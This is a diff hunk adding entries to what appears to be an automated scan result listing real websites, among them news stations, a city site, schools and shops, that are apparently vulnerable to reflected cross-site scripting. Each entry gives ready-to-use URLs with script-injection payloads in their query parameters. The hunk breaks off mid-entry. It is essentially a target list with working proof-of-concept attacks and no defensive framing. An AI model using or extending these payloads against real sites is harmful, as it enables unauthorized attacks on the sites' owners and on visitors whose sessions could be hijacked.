@@ -102,3 +102,556 @@ www.guessthespot.com/index.phpPatterns:
 3lpublishing.flyingcart.com/Patterns:
 +	http://3lpublishing.flyingcart.com/?p="><script>alert('XSS');</script>&pid="><script>alert('XSS');</script>&cat_id="><script>alert('XSS');</script>&
 --------------------------------------
+www.semsk.kz/newscat.phpPatterns:
++	http://www.semsk.kz/newscat.php?id="><script>alert('XSS');</script>&
++	http://www.semsk.kz/newscat.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.oasa.gr/newscat.phpPatterns:
++	http://www.oasa.gr/newscat.php?id="><script>alert('XSS');</script>&lang="><script>alert('XSS');</script>&
++	http://www.oasa.gr/newscat.php?id=--><script>alert('XSS');</script><!--&lang=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.wtap.com/newsPatterns:
++	https://www.wtap.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wtap.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.wibw.com/newsPatterns:
++	https://www.wibw.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wibw.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.wymt.com/newsPatterns:
++	https://www.wymt.com/news?cat="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.wymt.com/news?cat=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.us.marantz.com/us/products/pages/productdetails.aspxPatterns:
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid="><script>alert('XSS');</script>&productid="><script>alert('XSS');</script>&
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid=--><script>alert('XSS');</script><!--&productid=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.ktuu.com/news/Patterns:
++	https://www.ktuu.com/news/?path="><script>alert('XSS');</script>&cat="><script>alert('XSS');</script>&
++	https://www.ktuu.com/news/?path=--><script>alert('XSS');</script><!--&cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=content&id=SO1117&segment=SUPPORTproductCode%3D&productCode=LEXMARK_Z705&locale=de&userlocale=DE_DE&"><script>alert('XSS');</script>
++	http://support.lexmark.com/index?page="><script>alert('XSS');</script>&id="><script>alert('XSS');</script>&segment="><script>alert('XSS');</script>&productCode="><script>alert('XSS');</script>&locale="><script>alert('XSS');</script>&userlocale="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.zurrschienen.com/index.phpPatterns:
++	http://www.zurrschienen.com/index.php?option=com_content&view=article&id=6&Itemid=123&lang=de&"><script>alert('XSS');</script>
+--------------------------------------
+www.absima.shop/pp/absima-redcat-crawler-gen7pro-black-edition.htmPatterns:
++	https://www.absima.shop/pp/absima-redcat-crawler-gen7pro-black-edition.htm?shop=absima&SessionId=&a=article&ProdNr=RC00001&t=17960&c=19053&p=19053&"><script>alert('XSS');</script>
+--------------------------------------
+www.epc.eu/pub_details.phpPatterns:
++	http://www.epc.eu/pub_details.php?cat_id="><script>alert('XSS');</script>&pub_id="><script>alert('XSS');</script>&
++	http://www.epc.eu/pub_details.php?cat_id=--><script>alert('XSS');</script><!--&pub_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.galwayeast.com/showCategory.phpPatterns:
++	http://www.galwayeast.com/showCategory.php?cat_id="><script>alert('XSS');</script>&
++	http://www.galwayeast.com/showCategory.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.gurumama.ca/product-list.phpPatterns:
++	http://www.gurumama.ca/product-list.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+acrpub.com/journal.phpPatterns:
++	http://acrpub.com/journal.php?cat_id="><script>alert('XSS');</script>&
++	http://acrpub.com/journal.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+law.mc.edu/catalog/index.phpPatterns:
++	https://law.mc.edu/catalog/index.php?cat_id="><script>alert('XSS');</script>&
++	https://law.mc.edu/catalog/index.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.altenburg.eu/sixcms/detail.phpPatterns:
++	https://www.altenburg.eu/sixcms/detail.php?id=11685&"><script>alert('XSS');</script>
++	https://www.altenburg.eu/sixcms/detail.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080Patterns:
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080&"><script>alert('XSS');</script>
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id="><script>alert('XSS');</script>&
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.akurat-immobilien.de/immobilien-details.xhtmlPatterns:
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]="><script>alert('XSS');</script>&
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.running-wild.de/index.phpPatterns:
++	http://www.running-wild.de/index.php?newsid="><script>alert('XSS');</script>&searchstring="><script>alert('XSS');</script>&site="><script>alert('XSS');</script>&newscat="><script>alert('XSS');</script>&
++	http://www.running-wild.de/index.php?newsid=--><script>alert('XSS');</script><!--&searchstring=--><script>alert('XSS');</script><!--&site=--><script>alert('XSS');</script><!--&newscat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.iconnectjournal.com/newspage.phpPatterns:
++	https://www.iconnectjournal.com/newspage.php?newsid=--><script>alert('XSS');</script><!--&newscat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.kmvt.com/newsPatterns:
++	https://www.kmvt.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
++	https://www.kmvt.com/news?cat=--><script>alert('XSS');</script><!--&cat_type=--><script>alert('XSS');</script><!--&path=--><script>alert('XSS');</script><!--&
+--------------------------------------
+ys-tech.force.com/heatproof_topics_categoryPatterns:
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat="><script>alert('XSS');</script>&
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+ys-tech.secure.force.com/topics_categoryPatterns:
++	https://ys-tech.secure.force.com/topics_category?NewsCat="><script>alert('XSS');</script>&
++	https://ys-tech.secure.force.com/topics_category?NewsCat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.terratec.de/page.phpPatterns:
++	https://www.terratec.de/page.php?page=/support/&"><script>alert('XSS');</script>
++	https://www.terratec.de/page.php?page="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=driverSupport&locale=DE&userlocale=DE_DE&"><script>alert('XSS');</script>
++	http://support.lexmark.com/index?page="><script>alert('XSS');</script>&locale="><script>alert('XSS');</script>&userlocale="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.vespaclub.de/index.phpPatterns:
++	http://www.vespaclub.de/index.php?pageid="><script>alert('XSS');</script>&
++	http://www.vespaclub.de/index.php?pageid=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.camping-bergen.de/index.phpPatterns:
++	http://www.camping-bergen.de/index.php?pageID="><script>alert('XSS');</script>&
++	http://www.camping-bergen.de/index.php?pageID=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.stmz.ch/de/index.phpPatterns:
++	https://www.stmz.ch/de/index.php?page=8&pageId=20&"><script>alert('XSS');</script>
++	https://www.stmz.ch/de/index.php?page="><script>alert('XSS');</script>&pageId="><script>alert('XSS');</script>&
++	https://www.stmz.ch/de/index.php?page="><script>alert('XSS');</script>&pageId="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
++	https://www.stmz.ch/de/index.php?page=--><script>alert('XSS');</script><!--&pageId=--><script>alert('XSS');</script><!--&
+--------------------------------------
+zinzinotest.com/Patterns:
++	https://zinzinotest.com/?pageID=1&openLevel=19&langID=de&"><script>alert('XSS');</script>
++	https://zinzinotest.com/?pageID="><script>alert('XSS');</script>&openLevel="><script>alert('XSS');</script>&langID="><script>alert('XSS');</script>&
++	https://zinzinotest.com/?pageID=--><script>alert('XSS');</script><!--&openLevel=--><script>alert('XSS');</script><!--&langID=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.weinburg.eu/Patterns:
++	http://www.weinburg.eu/?pageID="><script>alert('XSS');</script>&
++	http://www.weinburg.eu/?pageID=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.westticket.de/-Tickets-3671/Patterns:
++	https://www.westticket.de/-Tickets-3671/?evLId=78918&pageId=3671&"><script>alert('XSS');</script>
+--------------------------------------
+www.stuttgart.de/baeder/index.phpPatterns:
++	https://www.stuttgart.de/baeder/index.php?objecttype="><script>alert('XSS');</script>&id="><script>alert('XSS');</script>&pageID="><script>alert('XSS');</script>&
++	https://www.stuttgart.de/baeder/index.php?objecttype=--><script>alert('XSS');</script><!--&id=--><script>alert('XSS');</script><!--&pageID=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.artgalerie-deutschland.de/top2.phpPatterns:
++	https://www.artgalerie-deutschland.de/top2.php?cat_id=195&"><script>alert('XSS');</script>
++	https://www.artgalerie-deutschland.de/top2.php?cat_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.guessthespot.com/index.phpPatterns:
++	http://www.guessthespot.com/index.php?cat_id="><script>alert('XSS');</script>&
++	http://www.guessthespot.com/index.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+3lpublishing.flyingcart.com/Patterns:
++	http://3lpublishing.flyingcart.com/?p="><script>alert('XSS');</script>&pid="><script>alert('XSS');</script>&cat_id="><script>alert('XSS');</script>&
++	http://3lpublishing.flyingcart.com/?p=--><script>alert('XSS');</script><!--&pid=--><script>alert('XSS');</script><!--&cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.belbana.com/our-products-detail.phpPatterns:
++	http://www.belbana.com/our-products-detail.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+www.meggieschneider.com/php/detail.phpPatterns:
++	http://www.meggieschneider.com/php/detail.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+www.nardev.com/productList.phpPatterns:
++	http://www.nardev.com/productList.php?CatID="><script>alert('XSS');</script>&
+--------------------------------------
+intanelectric.com/application/php/product-detail.phpPatterns:
++	http://intanelectric.com/application/php/product-detail.php?id="><script>alert('XSS');</script>&
++	http://intanelectric.com/application/php/product-detail.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+elimedcenter.com/view_items.phpPatterns:
++	http://elimedcenter.com/view_items.php?category_id=--><script>alert('XSS');</script><!--&/0product_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.sesric.org/event-detail.phpPatterns:
++	http://www.sesric.org/event-detail.php?id="><script>alert('XSS');</script>&
++	http://www.sesric.org/event-detail.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.wildwestrentals.com/moredetails.phpPatterns:
++	http://www.wildwestrentals.com/moredetails.php?id="><script>alert('XSS');</script>&
++	http://www.wildwestrentals.com/moredetails.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+cifango.org/about_us.phpPatterns:
++	http://cifango.org/about_us.php?id="><script>alert('XSS');</script>&
++	http://cifango.org/about_us.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.roxburys.com.au/view-items.phpPatterns:
++	https://www.roxburys.com.au/view-items.php?ID_Auction="><script>alert('XSS');</script>&
++	https://www.roxburys.com.au/view-items.php?ID_Auction=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.fiae.in/about-detail.phpPatterns:
++	http://www.fiae.in/about-detail.php?id="><script>alert('XSS');</script>&
++	http://www.fiae.in/about-detail.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.cepcomanagement.com/show.phpPatterns:
++	https://www.cepcomanagement.com/show.php?id="><script>alert('XSS');</script>&
++	https://www.cepcomanagement.com/show.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+southernplantsbay.com/view_items.phpPatterns:
++	http://southernplantsbay.com/view_items.php?id=3&"><script>alert('XSS');</script>
++	http://southernplantsbay.com/view_items.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.softbizscripts.com/scripts/auctionsplus/view_items.phpPatterns:
++	https://www.softbizscripts.com/scripts/auctionsplus/view_items.php?id=2&"><script>alert('XSS');</script>
++	https://www.softbizscripts.com/scripts/auctionsplus/view_items.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+cepcomanagement.com/show.phpPatterns:
++	http://cepcomanagement.com/show.php?id="><script>alert('XSS');</script>&
++	http://cepcomanagement.com/show.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.panelmatic.com/products.phpPatterns:
++	http://www.panelmatic.com/products.php?itemid="><script>alert('XSS');</script>&
++	http://www.panelmatic.com/products.php?itemid=--><script>alert('XSS');</script><!--&
+--------------------------------------
+my.awardscat.com/index.phpPatterns:
++	http://my.awardscat.com/index.php?id="><script>alert('XSS');</script>&
++	http://my.awardscat.com/index.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.rockstovrie.be/gig.phpPatterns:
++	http://www.rockstovrie.be/gig.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+www.roxburys.com/view-items.phpPatterns:
++	http://www.roxburys.com/view-items.php?ID_Auction="><script>alert('XSS');</script>&
++	http://www.roxburys.com/view-items.php?ID_Auction=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.bargainhunterauctions.com/category/Antiques/view_items.phpPatterns:
++	http://www.bargainhunterauctions.com/category/Antiques/view_items.php?id=1&"><script>alert('XSS');</script>
++	http://www.bargainhunterauctions.com/category/Antiques/view_items.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+demos1.softbiz.com/software/auction/view_items.phpPatterns:
++	http://demos1.softbiz.com/software/auction/view_items.php?id=2&"><script>alert('XSS');</script>
++	http://demos1.softbiz.com/software/auction/view_items.php?id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.ghanatimber.org/certification_details.phpPatterns:
++	http://www.ghanatimber.org/certification_details.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+kereso.startlap.hu/index.phpPatterns:
++	http://kereso.startlap.hu/index.php?q="><script>alert('XSS');</script>&sise="><script>alert('XSS');</script>&inpage="><script>alert('XSS');</script>&sticky="><script>alert('XSS');</script>&nhash="><script>alert('XSS');</script>&start="><script>alert('XSS');</script>&lr="><script>alert('XSS');</script>&client="><script>alert('XSS');</script>&
++	http://kereso.startlap.hu/index.php?q=--><script>alert('XSS');</script><!--&sise=--><script>alert('XSS');</script><!--&inpage=--><script>alert('XSS');</script><!--&sticky=--><script>alert('XSS');</script><!--&nhash=--><script>alert('XSS');</script><!--&start=--><script>alert('XSS');</script><!--&lr=--><script>alert('XSS');</script><!--&client=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.thebargainwarehouse.com/all_product.phpPatterns:
++	http://www.thebargainwarehouse.com/all_product.php?cat_id="><script>alert('XSS');</script>&
++	http://www.thebargainwarehouse.com/all_product.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+trends24.info/explorePatterns:
++	https://trends24.info/explore?q="><script>alert('XSS');</script>&
+--------------------------------------
+www.condortk.com/products.phpPatterns:
++	http://www.condortk.com/products.php?cat="><script>alert('XSS');</script>&
++	http://www.condortk.com/products.php?cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.spinmaster.com/support.phpPatterns:
++	https://www.spinmaster.com/support.php?userLoc="><script>alert('XSS');</script>&
++	https://www.spinmaster.com/support.php?userLoc=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.globalpenfriends.com/index.phpPatterns:
++	https://www.globalpenfriends.com/index.php?page="><script>alert('XSS');</script>&
++	https://www.globalpenfriends.com/index.php?page=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.bolha.com/igrace-otroska-oprema/otroska-oprema/nahrbtniki-torbe/previjalne-torbe/Patterns:
++	http://www.bolha.com/igrace-otroska-oprema/otroska-oprema/nahrbtniki-torbe/previjalne-torbe/?location="><script>alert('XSS');</script>&page="><script>alert('XSS');</script>&
+--------------------------------------
+podcast.rthk.hk/podcast/item.phpPatterns:
++	https://podcast.rthk.hk/podcast/item.php?pid=164&"><script>alert('XSS');</script>
+--------------------------------------
+podcasts.rthk.hk/podcast/item.phpPatterns:
++	https://podcasts.rthk.hk/podcast/item.php?pid=876&"><script>alert('XSS');</script>
+--------------------------------------
+podcasts.rthk.hk/podcast/item.phpPatterns:
++	https://podcasts.rthk.hk/podcast/item.php?pid=876&lang=zh-CN&"><script>alert('XSS');</script>
+--------------------------------------
+www.noble-house.eu/catalog/product_info.phpPatterns:
++	http://www.noble-house.eu/catalog/product_info.php?products_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.spotmodel.com/product_info.phpPatterns:
++	https://www.spotmodel.com/product_info.php?products_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+shop.fightplace.com/product_info.phpPatterns:
++	http://shop.fightplace.com/product_info.php?products_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.cross.ch/product_info.phpPatterns:
++	https://www.cross.ch/product_info.php?products_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.tintenprofi.ch/product_info.phpPatterns:
++	https://www.tintenprofi.ch/product_info.php?products_id="><script>alert('XSS');</script>&
++	https://www.tintenprofi.ch/product_info.php?products_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+dartscorner.co.uk/product_info.phpPatterns:
++	https://dartscorner.co.uk/product_info.php?products_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chipquik.com/store/product_info.phpPatterns:
++	http://www.chipquik.com/store/product_info.php?products_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+maph.com.br/product_info.phpPatterns:
++	http://maph.com.br/product_info.php?products_id="><script>alert('XSS');</script>&
++	http://maph.com.br/product_info.php?products_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.canterburyct.org/department.phpPatterns:
++	http://www.canterburyct.org/department.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+ptevara.in/product-details.phpPatterns:
++	https://ptevara.in/product-details.php?id="><script>alert('XSS');</script>&
++	https://ptevara.in/product-details.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.plecterlabs.com/shop/index.phpPatterns:
++	http://www.plecterlabs.com/shop/index.php?cPath="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.highteen.cn/productlist.phpPatterns:
++	http://www.highteen.cn/productlist.php?fid="><script>alert('XSS');</script>&
+--------------------------------------
+www.fuoxin.com/productlist.phpPatterns:
++	http://www.fuoxin.com/productlist.php?fid="><script>alert('XSS');</script>&
++	http://www.fuoxin.com/productlist.php?fid=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.paufau.tw/main.phpPatterns:
++	http://www.paufau.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.paufau.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.eiffelnet.com.tw/main.phpPatterns:
++	https://www.eiffelnet.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	https://www.eiffelnet.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.czi.tw/main.phpPatterns:
++	http://www.czi.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.czi.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.nncjzc.com/product/list.phpPatterns:
++	http://www.nncjzc.com/product/list.php?fid=34&"><script>alert('XSS');</script>
++	http://www.nncjzc.com/product/list.php?fid="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.goorik.com/main.phpPatterns:
++	http://www.goorik.com/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.goorik.com/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.lcair.com.tw/main.phpPatterns:
++	http://www.lcair.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.lcair.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.mysc.com.tw/main.phpPatterns:
++	https://www.mysc.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	https://www.mysc.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.gaharu.com.tw/main.phpPatterns:
++	http://www.gaharu.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.gaharu.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+raychuan.chasme.com.tw/main.phpPatterns:
++	http://raychuan.chasme.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://raychuan.chasme.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+ctm-welder.chasme.com.tw/main.phpPatterns:
++	http://ctm-welder.chasme.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://ctm-welder.chasme.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chec.org.tw/main.phpPatterns:
++	http://www.chec.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chec.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.salianbao.org.tw/main.phpPatterns:
++	http://www.salianbao.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.salianbao.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.tai-shying.com.tw/main.phpPatterns:
++	http://www.tai-shying.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.tai-shying.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chuanho.com.tw/main.phpPatterns:
++	http://www.chuanho.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chuanho.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.ctusttfm.com.tw/main.phpPatterns:
++	http://www.ctusttfm.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.ctusttfm.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.ncpa.org.tw/main.phpPatterns:
++	http://www.ncpa.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.ncpa.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+italdecorltd.com/catalog/main.phpPatterns:
++	http://italdecorltd.com/catalog/main.php?cat_id="><script>alert('XSS');</script>&
++	http://italdecorltd.com/catalog/main.php?cat_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.okfood.btb.tw/main.phpPatterns:
++	http://www.okfood.btb.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&
++	http://www.okfood.btb.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.ricun.btb.tw/main.phpPatterns:
++	http://www.ricun.btb.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.ricun.btb.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.e-school.org.tw/main.phpPatterns:
++	http://www.e-school.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.e-school.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chuanho.com.tw/main.phpPatterns:
++	http://www.chuanho.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&
++	http://www.chuanho.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&
+--------------------------------------
+goorik.chasme.com.tw/main.phpPatterns:
++	http://goorik.chasme.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://goorik.chasme.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+cp.eces.ntpc.edu.tw/main.phpPatterns:
++	http://cp.eces.ntpc.edu.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&
++	http://cp.eces.ntpc.edu.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.mainhand.com.tw/main.phpPatterns:
++	http://www.mainhand.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.mainhand.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.westpakusa.com/detail.phpPatterns:
++	http://www.westpakusa.com/detail.php?prodid="><script>alert('XSS');</script>&lang_sess="><script>alert('XSS');</script>&
++	http://www.westpakusa.com/detail.php?prodid=--><script>alert('XSS');</script><!--&lang_sess=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.kindergarten.org.tw/main.phpPatterns:
++	http://www.kindergarten.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.kindergarten.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+santsai.kidschool.org.tw/main.phpPatterns:
++	http://santsai.kidschool.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://santsai.kidschool.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.jg100.com.tw/main.phpPatterns:
